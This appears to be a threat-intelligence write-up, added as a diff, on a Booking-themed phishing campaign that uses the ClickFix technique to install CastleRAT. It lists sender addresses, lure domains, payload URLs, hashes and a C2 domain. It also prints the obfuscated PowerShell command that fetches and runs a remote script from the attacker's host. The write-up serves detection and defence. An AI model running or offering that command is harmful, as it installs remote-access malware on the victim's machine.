@@ -1,0 +1,73 @@
+Email with characteristics (Examples):
+
+From:
+```
+TrustSupport <hideki-o@i-nozomi.net>
+SupportPlus <hideki-o@i-nozomi.net>
+TotalCare <hideki-o@i-nozomi.net>
+ContactPro <hideki-o@i-nozomi.net>
+ClientFirst <hideki-o@i-nozomi.net>
+HelpPortal <hideki-o@i-nozomi.net>
+InfoSupport <hideki-o@i-nozomi.net>
+SmartAssist <hideki-o@i-nozomi.net>
+```
+
+Reply-to
+```
+Reply-To: PartnerAssist <lthinam97@gmail.com>
+```
+
+Subject:
+```
+New message from the guest 
+```
+
+The message contain a link leading to a Cloudflare verification. If completed, the user is directed to a Booking-themed verification. Once completed, the user is directed to a "Booking" presenting the ClickFix technique. If the user copies and pastes the PowerShell script as instructed, it will execute a second PowerShell script ultimately leading to the installation of CastleRAT (C Variant). 
+
+ClickFix Command
+```
+powershell -w h -ep b -nop -c "$h='blkiesf.c'+'om/upd';iex(iwr $h -useb).Content"
+```
+
+The ClickFix Command retrieves a remote PowerShell script, which is fed into Invoke-Expression and run immediately in the current PowerShell process in memory.
+This remote PowerShell script acts as an intermediate downloader/installer for a Zip payload.
+
+---- IOCs ----
+
+Landing Page:
+ type: payload
+ domains:
+ - guestnumber102947.icu
+ - infoguestbook10284.icu
+ - informreservnumber129304.icu
+ - newmessage10294.com
+ - newrecuest10294735.com
+ - newrecuestfrom300173.com
+ - requestguest10294.icu
+
+ClickFix Payload:
+ type: payload
+ urls:
+ - https://blkiesf.com/upd
+ domains:
+ - blkiesf.com
+ sha256s:
+ - cade6164cac6115edfcf81ca068901aa6ae5c4cc2a3cc4a6297ac7fc09ee2ce0
+
+PowerShell Payload:
+ type: payload
+ urls:
+ - https://blkiesf.com/apip/f/f
+ sha256s:
+ - f2cb700222042ab83c26790548740ba8f0d4ceccc5e8a3dfbacbc7124fd2c6a3
+
+CastleRAT Callback:
+ type: payload
+ urls:
+ - http://www.ip-api.com/line/?fields=147457
+ - https://steamcommunity.com/id/krouvhsin34287f7h3
+
+Castle C2:
+ type: c2
+ domains:
+ - justnewdmain.com
